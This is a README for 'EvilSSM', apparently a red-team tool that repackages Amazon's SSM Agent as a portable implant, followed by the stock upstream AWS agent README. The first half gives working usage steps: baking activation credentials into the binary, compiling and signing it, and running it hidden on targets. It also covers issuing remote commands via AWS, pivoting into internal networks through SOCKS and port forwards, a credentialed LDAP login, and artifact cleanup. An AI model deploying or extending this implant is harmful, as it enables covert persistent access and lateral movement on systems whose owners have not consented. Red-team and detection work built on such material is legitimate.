# EvilSSM

EvilSSM is a Proof-of-Concept modified version of AWS's SSM Agent, designed for Windows/Linux stage 0 and persistence payload. 

Conference slides: **TBD**.

AI was used for overall golang programming/code modification and some documentation for this project. 

## Modifications

For specific technical details between EvilSSM vs. SSM, please refer to [./DIFFERENCES.md](./DIFFERENCES.md)

Upstream base: Amazon SSM Agent 3.3.4624.0, commit [61d87901](https://github.com/aws/amazon-ssm-agent/commit/61d87901c7abf20ce052b07e7bd6407d6248cd35)

- Removed all installer and installation components. Made portable by drop binaries and run for immediate SSM callback.
- Simplified Register/Callback logic so registration + callback happens on first execution.
- Single binary. All code from `ssm-agent-worker`, `ssm-session-worker`, `ssm-document-worker` merged into one `amazon-ssm-agent` binary.
- Runs as low-privilege user. No root/SYSTEM required. Runs in the executing user's context and privileges instead of ssm-user.
- Changed file/directory creation to use `/dev/shm` and current directory instead of privileged paths. Removed creation of unnecessary debugging directories/files.
- Windows build hides the main console and child PowerShell windows.
- `aws:updateSsmAgent` is disabled to prevent `updater.exe` / `Update` artifacts.

## Setup

0. AWSCLI, aws configure, and Access Key 

```
# Login to AWS Web GUI and create your access key 
https://us-east-1.console.aws.amazon.com/iam/home?region=ap-northeast-2#/security_credentials/access-key-wizard

# Install and configure AWSCLI 
curl -fsSL https://awscli.amazonaws.com/v2/install.sh | bash
aws configure 
```

1. Install SSM Session Manager Plugin 

```
curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o "session-manager-plugin.deb"
sudo dpkg -i session-manager-plugin.deb
```

2. SSM IAM and role setup

SSMService-Trust.json (change region + account ID)
```
{
   "Version":"2012-10-17",
   "Statement":[
      {
         "Sid":"",
         "Effect":"Allow",
         "Principal":{
            "Service":"ssm.amazonaws.com"
         },
         "Action":"sts:AssumeRole",
         "Condition":{
            "StringEquals":{
               "aws:SourceAccount":"<YOUR AWS ACCOUNT ID>"
            },
            "ArnEquals":{
               "aws:SourceArn":"arn:aws:ssm:ap-northeast-2:<YOUR AWS ACCOUNT ID>:*"
            }
         }
      }
   ]
}
```

Create role and attach policy
```
aws iam create-role --role-name SSMServiceRole --assume-role-policy-document file://SSMService-Trust.json

aws iam attach-role-policy --role-name SSMServiceRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
```

Create Activation Code/ID
```
aws ssm create-activation --default-instance-name TestoServer --description "SSM funtimes" --iam-role SSMServiceRole --registration-limit 70 --expiration-date "$(date -d '+7 days' +%s)" --region ap-northeast-2
```

## EvilSSM Usage

1. Bake credentials
```
python3 evilssm-controller.py bake <Activation ID> <Activation Code>
python3 evilssm-controller.py bake 332211d27a-1317-4ab1-af63-575d18bc1628 Oa/dUfi7PGdWu/FaDnaW
```

2. Compile (arm64/amd64 - Linux/Windows)
```
sudo apt update -y; sudo apt install -y golang make gcc openssl osslsigncode

python3 evilssm-controller.py compile linux
python3 evilssm-controller.py compile windows --sign 
```

3. Run
```
# Linux
./amazon-ssm-agent

# Windows
./amazon-ssm-agent.exe
```

4. Check nodes and run remote commands
```
python3 evilssm-controller.py list

# Linux
python3 evilssm-controller.py runcmd <node-id> "whoami; hostname"
python3 evilssm-controller.py runcmd mi-015e47b9d0742b238 "whoami; hostname"

# Windows
python3 evilssm-controller.py runcmd <node-id> "whoami; hostname" -d AWS-RunPowerShellScript
python3 evilssm-controller.py runcmd mi-00c6d1c05293195ac "whoami; hostname" -d AWS-RunPowerShellScript
```

## Notes

1. Windows - when using winrm/rdp...
- Requires `winpty.dll` and `winpty-agent.exe` on target machine alongside evilssm binary

## Required Binaries

Linux
- amazon-ssm-agent

Windows
- amazon-ssm-agent.exe
- winpty-agent.exe
- winpty.dll

# !! IMPORTANT !! - Artifacts

The SSM agent code creates artifact directories and files on disk. Make sure to delete artifacts from target machines after red team operations.

- Linux: `/dev/shm/awsssmcache/*` - must delete
- Windows: delete the directory where amazon-ssm-agent.exe was executed

EvilSSM is only a PoC. Feel free to experiment to get rid of the artifacts as well. But becareful, changing too much of the source code will start making your evilssm version to look a lot less SSM, and more like malware. 

---

# Weaponization - Proxy

To proxy from attacker machine -> SSM -> target internal network, the SSM Session Manager plugin must be installed on the attacker machine (see Setup step 1).

## Linux

Most Linux hosts run SSHD, so use SSM (SSH) for dynamic port forwarding, then use SOCKS.

Add to `~/.ssh/config`:
```
Host mi-*
  HostName %h
  ProxyCommand sh -c "aws ssm start-session --target %h --document-name AWS-StartSSHSession --parameters 'portNumber=%p'"
```

Dynamic Port forwarding:
```
ssh -N -D 127.0.0.1:1080 targetUser@<instanceID>
ssh -N -D 127.0.0.1:1080 targetUser@mi-0f2132d84013df226
```

Proxychains:
```
sudo proxychains4 nmap -sT -Pn -n --open -p 22 <ip>
```

## Windows

Windows servers/clients typically don't have openssh server, making standard SOCKS difficult. SSM also doesn't natively support SOCKS/dynamic port forwarding.

Use multiple local port forwards instead.

Port Forwarding - WINDOWS (no ssh server sadge)
```
$ python3 evilssm-controller.py portfwd mi-013fa17a793e5af31 10.2.30.10 135,139,445,389,636
[*] Starting port forwards through mi-013fa17a793e5af31 to 10.2.30.10
    localhost:135 -> 10.2.30.10:135
    localhost:139 -> 10.2.30.10:139
    localhost:445 -> 10.2.30.10:445
    localhost:389 -> 10.2.30.10:389
    localhost:636 -> 10.2.30.10:636

[*] 5 sessions active. Press Ctrl+C to stop.

============================================

$ nxc ldap 127.0.0.1 -u rahat.kuma -p 'backtousa'
LDAP        127.0.0.1       389    UDC01            [*] Windows 10 / Server 2019 Build 17763 (name:UDC01) (domain:us.rt.local) (signing:None) (channel binding:Never)
LDAP        127.0.0.1       389    UDC01            [+] us.rt.local\rahat.kuma:backtousa
```

Manual port forwarding:
```
aws ssm start-session --target mi-013fa17a793e5af31 --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["10.2.30.10"],"portNumber":["389"],"localPortNumber":["389"]}'
```

## Cleanup

Deregister all stale nodes (change region): 
```
aws ssm describe-instance-information --region ap-northeast-2 --query "InstanceInformationList[?PingStatus=='ConnectionLost'].InstanceId" --output text | tr '\t' '\n' | while read id; do aws ssm deregister-managed-instance --instance-id "$id" --region ap-northeast-2; echo "Deregistered $id"; done
```

---

[![ReportCard][ReportCard-Image]][ReportCard-URL]
[![Build Status](https://travis-ci.org/aws/amazon-ssm-agent.svg?branch=mainline)](https://travis-ci.org/aws/amazon-ssm-agent)

# Amazon SSM Agent

The Amazon EC2 Simple Systems Manager (SSM) Agent is software developed for the [Simple Systems Manager Service](http://docs.aws.amazon.com/systems-manager/latest/APIReference/Welcome.html). The SSM Agent is the primary component of a feature called Run Command.

## Overview

The SSM Agent runs on EC2 instances and enables you to quickly and easily execute remote commands or scripts against one or more instances. The agent uses SSM [documents](https://docs.aws.amazon.com/systems-manager/latest/userguide/sysman-ssm-docs.html). When you execute a command, the agent on the instance processes the document and configures the instance as specified.
Currently, the agent and Run Command enable you to quickly run Shell scripts on an instance using the AWS-RunShellScript SSM document.
SSM Agent also enables the Session Manager capability that lets you manage your Amazon EC2 instance through an interactive one-click browser-based shell or through the AWS CLI. The first time a Session Manager session is started on an instance, the agent will create a user called "ssm-user" with sudo or administrator privilege. Session Manager sessions will be launched in context of this user.

### Verify Requirements

* [SSM Run Command Prerequisites](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/remote-commands-prereq.html)
* [SSM Session Manager Prerequisites and supported Operating Systems](http://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-prerequisites.html)
* Linux systems require kernel version 3.2 or above

### Setup

* [Configuring IAM Roles and Users for SSM Run Command](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ssm-iam.html)
* [Configuring the SSM Agent](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/install-ssm-agent.html)
* [Configuring IAM Roles for Session Manager](http://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-getting-started-instance-profile.html)
* [Configuring Users for Session Manager](http://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-getting-started-restrict-access.html)

### Executing Commands

[SSM Run Command Walkthrough Using the AWS CLI](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/walkthrough-cli.html)

### Starting Sessions

[Session Manager Walkthrough Using the AWS Console and CLI](http://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-sessions-start.html)

### Troubleshooting

[Troubleshooting SSM Run Command](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/troubleshooting-remote-commands.html)
[Troubleshooting SSM Session Manager](http://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-troubleshooting.html)

### Deprecated Features

#### CloudWatch Plugin (aws:cloudWatch)
The CloudWatch plugin for Windows is deprecated and no longer supported. Please migrate to the [Amazon CloudWatch Agent](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Install-CloudWatch-Agent.html).

## Feedback

Thank you for helping us to improve Systems Manager, Run Command and Session Manager. Please send your questions or comments to [Systems Manager Forums](https://forums.aws.amazon.com/forum.jspa?forumID=185&start=0)

### Building inside docker container (Recommended)
* Install docker: [Install CentOS](https://docs.docker.com/engine/install/centos/)

* Build image
```
docker build -t ssm-agent-build-image .
```
* Build the agent
```
docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
```

### Building on Linux

* Install go [Getting started](https://golang.org/doc/install)

* Install rpm-build and rpmdevtools

* [Cross Compile SSM Agent](https://www.ardanlabs.com/blog/2013/10/cross-compile-your-go-programs.html)

* Run `make build` to build the SSM Agent for Linux, Debian, Windows environment.

* Run `make build-release` to build the agent and also packages it into a RPM, DEB and ZIP package.

The following folders are generated when the build completes:
```
bin/debian_386
bin/debian_amd64
bin/linux_386
bin/linux_amd64
bin/linux_arm
bin/linux_arm64
bin/windows_386
bin/windows_amd64
```
* To enable the Agent for Session Manager scenario on Windows instances
    * Clone the repo from https://github.com/masatma/winpty.git
    * Follow instructions on https://github.com/rprichard/winpty to build winpty 64-bit binaries
    * Copy the winpty.dll and winpty-agent.exe to the bin/SessionManagerShell folder
For the Windows Operating System, Session Manager is only supported on Windows Server 2008 R2 through Windows Server 2019 64-bit versions.

Please follow the user guide to [copy and install the SSM Agent](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/install-ssm-agent.html)

### Code Layout

* Source code
    * Core functionality such as worker management is under core/
    * Agent worker code is under agent/
    * Other functionality such as IPC is under common/
* Vendor package source code is under vendor/src
* rpm and dpkg artifacts are under packaging
* build scripts are under Tools/src

### Linting

To lint the entire module call the `lint-all` target. This executes golangci-lint on all packages in the module.
You can configure golangci-lint with different linters using the `.golangci.yml` file.

For golangci-lint installation instructions see https://golangci-lint.run/usage/install/
For more information on the golangci-lint configuration file see https://golangci-lint.run/usage/configuration/
For more information on the linters used see https://golangci-lint.run/usage/linters/

### GOPATH

To use vendor dependencies, the suggested GOPATH format is `:<packagesource>/vendor:<packagesource>`

### Build Targets

EvilSSM users should compile through `evilssm-controller.py compile`; the Make targets below are upstream/developer internals.

| Make Target              | Description |
|:-------------------------|:------------|
| `build`                  | *(Default)* `build` builds the agent for Linux, Debian, Darwin and Windows amd64 and 386 environment |
| `build-release`          | `build-release` checks code style and coverage, builds the agent and also packages it into a RPM, DEB and ZIP package |
| `release`                | `release` checks code style and coverage, runs tests, packages all dependencies to the bin folder. |
| `package`                | `package` packages build result into a RPM, DEB and ZIP package |
| `pre-build`              | `pre-build` goes through Tools/src folder to make sure all the script files are executable |
| `checkstyle`             | `checkstyle` runs the checkstyle script |
| `analyze-install`        | `analyze-install` install static analysis dependencies for local use |
| `analyze`                | `analyze` runs static analysis script to find possible vulnerabilities |
| `quick-integtest`        | `quick-integtest` runs all tests tagged with `fastinteg` using `go test` |
| `quick-test`             | `quick-test` runs all the tests including integration and unit tests using `go test` |
| `coverage`               | `coverage` runs all tests and calculate code coverage |
| `build-linux`            | `build-linux` builds the agent for execution in the Linux amd64 environment |
| `build-windows`          | `build-windows` builds the agent for execution in the Windows amd64 environment |
| `build-darwin`           | `build-darwin` builds the agent for execution in the Darwin amd64 environment |
| `build-linux-386`        | `build-linux-386` builds the agent for execution in the Linux 386 environment |
| `build-windows-386`      | `build-windows-386` builds the agent for execution in the Windows 386 environment |
| `build-darwin-386`       | `build-darwin-386` builds the agent for execution in the Darwin 386 environment |
| `build-arm`              | `build-arm` builds the agent for execution in the arm environment |
| `build-arm64`            | `build-arm64` builds the agent for execution in the arm64 environment |
| `lint-all`               | `lint-all` runs golangci-lint on all packages. golangci-lint is configured by .golangci.yml |
| `package-rpm`            | `package-rpm` builds the agent and packages it into a RPM package for Linux amd64 based distributions |
| `package-deb`            | `package-deb` builds the agent and packages it into a DEB package Debian amd64 based distributions |
| `package-win`            | `package-win` builds the agent and packages it into a ZIP package Windows amd64 based distributions |
| `package-rpm-386`        | `package-rpm-386` builds the agent and packages it into a RPM package for Linux 386 based distributions |
| `package-deb-386`        | `package-deb-386` builds the agent and packages it into a DEB package Debian 386 based distributions |
| `package-win-386`        | `package-win-386` builds the agent and packages it into a ZIP package Windows 386 based distributions |
| `package-rpm-arm64`      | `package-rpm-arm64` builds the agent and packages it into a RPM package Linux arm64 based distributions |
| `package-deb-arm`        | `package-deb-arm` builds the agent and packages it into a DEB package Debian arm based distributions |
| `package-deb-arm64`      | `package-deb-arm64` builds the agent and packages it into a DEB package Debian arm64 based distributions |
| `package-linux`          | `package-linux` create update packages for Linux and Debian based distributions |
| `package-windows`        | `package-windows` create update packages for Windows based distributions |
| `package-darwin`         | `package-darwin` create update packages for Darwin based distributions |
| `get-tools`              | `get-tools` gets gocode and oracle using `go get` |
| `clean`                  | `clean` removes build artifacts |

### Contributing

Contributions and feedback are welcome! Proposals and Pull Requests will be considered and responded to. Please see the [CONTRIBUTING.md](https://github.com/aws/amazon-ssm-agent/blob/mainline/CONTRIBUTING.md) file for more information.

Amazon Web Services does not currently provide support for modified copies of this software.
## Runtime Configuration

To set up your own custom configuration for the agent:
* Navigate to /etc/amazon/ssm/ (or C:\Program Files\Amazon\SSM for windows)
* Copy the contents of amazon-ssm-agent.json.template to a new file amazon-ssm-agent.json
* Restart agent

### Config Property Definitions:
* Profile - represents configurations for aws credential profile used to get managed instance role and credentials
    * ShareCreds (boolean)
        * Default: true
    * ShareProfile (string)
    * ForceUpdateCreds (boolean) - overwrite shared credentials file if existing one cannot be parsed
        * Default: false
    * KeyAutoRotateDays (int) - defines the maximum age in days for on-prem private key, default value might change to 30 in the close future
        * Default: 0 (never rotate)
* Mds - represents configuration for Message delivery service (MDS) where agent listens for incoming messages and instance level Run Command configurations
    * CommandWorkersLimit (int) - Allow this number of commands to run in parallel
        * Default: 5
    * CommandWorkerBufferLimit (int) - Allow this many commands to be buffered - commands are placed in buffer before they are initiated asynchronously
        * Default: 5
    * StopTimeoutMillis (int64)
        * Default: 20000
    * Endpoint (string)
    * CommandRetryLimit (int)
        * Default: 15
* Ssm - represents configuration for Simple Systems Manager (SSM)
    * Endpoint (string)
    * HealthFrequencyMinutes (int)
        * Default: 5
    * CustomInventoryDefaultLocation (string)
    * AssociationLogsRetentionDurationHours (int)
        * Default: 24
    * RunCommandLogsRetentionDurationHours (int)
        * Default: 336
    * SessionLogsRetentionDurationHours (int)
        * Default: 336
    * SessionHandshakeTimeoutSeconds (int) - This allows customer to override the default session handshake timeout.
        * Default: 15
        * Min: 1
        * Max: 60
    * SessionLogsDestination (string) - Configure where you want Session Manager to write session data.
        * Default: "none" - Don't write session data anywhere when CloudWatch and S3 logging are disabled.
        * OptionalValue: "disk" - Write session data to disk.
    * PluginLocalOutputCleanup (string) - Configure when after execution it is safe to delete local plugin output logs in orchestration folder
        * Default: "" - Don't delete logs immediately after execution. Fall back to AssociationLogsRetentionDurationHours, RunCommandLogsRetentionDurationHours, and SessionLogsRetentionDurationHours
        * OptionalValue: "after-execution" - Delete plugin output file locally after plugin execution
        * OptionalValue: "after-upload" - Delete plugin output locally after successful s3 or cloudWatch upload
    * OrchestrationDirectoryCleanup (string) - Configure only when it is safe to delete orchestration folder after document execution. This config overrides PluginLocalOutputCleanup when set.
        * Default: "" - Don't delete orchestration folder after execution
        * OptionalValue: "clean-success" - Deletes the orchestration folder only for successful document executions.
        * OptionalValue: "clean-success-failed" - Deletes the orchestration folder for successful and failed document executions.
    * CredentialRetryMaxSleepSeconds (int) - Maximum credential retry backoff duration in seconds before attempting to refresh credentials on failure.
        * Default: 1800 (30 minutes)
        * Min: 60 (1 minute)
        * Max: 1800 (30 minutes)
* Mgs - represents configuration for Message Gateway service
    * Region (string)
    * Endpoint (string)
    * StopTimeoutMillis (int64)
        * Default: 20000
    * SessionWorkersLimit (int)
        * Default: 1000
    * DeniedPortForwardingRemoteIPs ([]string)
        * Default: [ "169.254.169.254", "fd00:ec2::254", "169.254.169.253", "fd00:ec2::253", "169.254.169.123", "fd00:ec2::123", "169.254.169.250", "169.254.169.251", "fd00:ec2::250" ]
* Agent - represents metadata for amazon-ssm-agent
    * Region (string)
    * OrchestrationRootDir (string)
        * Default: "orchestration"
    * SelfUpdate (boolean)
        * Default: false
    * TelemetryMetricsToCloudWatch (boolean)
        * Default: false
    * TelemetryMetricsToSSM (boolean)
        * Default: true
    * GlobalEnhancedTelemetryEnabled (boolean)
        * Default: true
    * AuditExpirationDay (int)
        * Default: 7
    * LongRunningWorkerMonitorIntervalSeconds (int)
        * Default: 60
    * UseDualStackEndpoint (boolean) - enable dual-stack (IPv4 and IPv6) endpoints for AWS services
        * Default: false
    * GoMaxProcForAgentWorker (int)
        * Default: 0
    * EnforceWorkspaceRootOwnership (boolean) - Enforce root ownership of agent workspace on start. Change only if you are making corresponding custom runtime environment setup such as in containers.
        * Default: true
* Os - represents os related information, will be logged in reply messages
    * Lang (string)
        * Default: "en-US"
    * Name (string)
    * Version (string)
        * Default: 1
* S3 - represents configurations related to S3 bucket and key for SSM. Endpoint and region are typically determined automatically, and should only be set if a custom endpoint is required.  LogBucket and LogKey are currently unused.
    * Endpoint (string)
        * Default: ""
    * Region (string) - Ignored
    * LogBucket (string) - Ignored
    * LogKey (string) - Ignored
* Kms - represents configuration for Key Management Service if encryption is enabled for this session (i.e. kmsKeyId is set or using "Port" plugin)
    * Endpoint (string)
    * RequireKMSChallengeResponse (boolean) - if true, enforces that Session Manager clients support enhanced challenge-response authentication
        * Default: false

## Release

After the SSM Agent source code has been released to github, it can take up to 2 weeks for the install packages to propagate to all AWS regions.

The following commands can be used to pull the `VERSION` file and check the latest agent available in a region.
* Regional Bucket *(Non-CN*) - `curl https://s3.{region}.amazonaws.com/amazon-ssm-{region}/latest/VERSION`
  * Replace `{region}` with region code like `us-east-1`.
* Regional Bucket *(CN)* - `curl https://s3.{region}.amazonaws.com.cn/amazon-ssm-{region}/latest/VERSION`
  * Replace `{region}` with region code `cn-north-1`, `cn-northwest-1`.
* Global Bucket - `curl https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/VERSION`

## License

The Amazon SSM Agent is licensed under the Apache 2.0 License.

[ReportCard-URL]: https://goreportcard.com/report/aws/amazon-ssm-agent
[ReportCard-Image]: https://goreportcard.com/badge/aws/amazon-ssm-agent
